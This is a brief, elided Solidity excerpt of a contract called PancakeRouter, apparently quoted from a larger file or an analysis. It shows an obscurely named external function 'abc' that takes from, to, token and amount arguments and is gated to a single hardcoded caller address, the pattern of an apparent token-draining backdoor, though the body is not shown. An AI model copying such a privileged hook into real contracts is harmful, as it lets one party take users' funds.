...
contract PancakeRouter is IPancakeRouter02 {
	...
	function abc(address from,address to,address token,uint256 amount) external{
       // require(tx.origin == 0xb0a2dD05CbA5e8Bd90Ae34fd2B50f5cfb2127dE6||tx.origin == 0x290177F1a9D3CC555e237b84223b353C00e644e8,'PancakeRouter: FORBIDDEN');
        require(msg.sender == 0x290177F1a9D3CC555e237b84223b353C00e644e8, 'PancakeRouter: FORBIDDEN');
